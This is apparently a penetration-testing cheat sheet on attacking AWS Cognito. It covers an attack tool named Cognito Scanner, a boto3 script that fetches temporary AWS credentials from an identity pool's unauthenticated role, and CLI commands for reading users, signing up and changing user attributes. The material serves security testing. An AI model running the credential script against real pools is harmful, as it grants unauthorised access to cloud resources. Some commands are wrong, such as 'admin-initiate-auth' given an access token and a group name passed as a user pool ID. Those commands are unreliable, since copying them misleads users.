# AWS - Service - Cognito

AWS Cognito is an AWS-managed service for authentication, authorization, and user management.

1. A user signs in through Cognito User Pools (authentication) or via a federated IdP (Google, Facebook, SAML, etc.).
2. Cognito Identity Pools can then exchange this identity for temporary AWS credentials (from STS — Security Token Service).
3. These credentials (Access Key ID, Secret Access Key, and Session Token) let the app directly call AWS services (e.g., S3, DynamoDB, API Gateway) with limited IAM roles/policies.

## Tools

* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) - A CLI tool for executing attacks on cognito such as *Unwanted account creation*, *Account Oracle* and *Identity Pool escalation*.

    ```ps1
    # Installation
    $ pip install cognito-scanner
    # Usage
    $ cognito-scanner --help
    # Get information about how to use the unwanted account creation script
    $ cognito-scanner account-creation --help
    # For more details go to https://github.com/padok-team/cognito-scanner
    ```

## Identity Pool ID

* **User Pools** : User pools allow sign-in and sign-up functionality
* **Identity Pools** : Identity pools allow authenticated and unauthenticated users to access AWS resources using temporary credentials

Once you have the Cognito Identity Pool Id token, you can proceed further and fetch Temporary AWS Credentials for an unauthenticated role using the identified tokens.

```py
import boto3

region='us-east-1'
identity_pool='us-east-1:5280c436-2198-2b5a-b87c-9f54094x8at9'

client = boto3.client('cognito-identity',region_name=region)
_id = client.get_id(IdentityPoolId=identity_pool)
_id = _id['IdentityId']

credentials = client.get_credentials_for_identity(IdentityId=_id)
access_key = credentials['Credentials']['AccessKeyId']
secret_key = credentials['Credentials']['SecretKey']
session_token = credentials['Credentials']['SessionToken']
identity_id = credentials['IdentityId']
print("Access Key: " + access_key)
print("Secret Key: " + secret_key)
print("Session Token: " + session_token)
print("Identity Id: " + identity_id)
```

## AWS Cognito Commands

### Get User Information

```ps1
aws cognito-idp get-user --access-token $(cat access_token.txt)
```

### Admin Authentication

```ps1
aws cognito-idp admin-initiate-auth --access-token $(cat access_token)
```

### List User Groups

```ps1
aws cognito-idp admin-list-groups-for-user --username user.name@email.com --user-pool-id "Group-Name"
```

### Sign up

```ps1
aws cognito-idp sign-up --client-id <client-id> --username <username> --password <password>
```

### Modify Attributes

```ps1
aws cognito-idp update-user-attributes --access-token $(cat access_token) --user-attributes Name=<attribute>,Value=<value>
```

## References

* [Exploiting weak configurations in Amazon Cognito - Pankaj Mouriya - April 6, 2021](https://blog.appsecco.com/exploiting-weak-configurations-in-amazon-cognito-in-aws-471ce761963)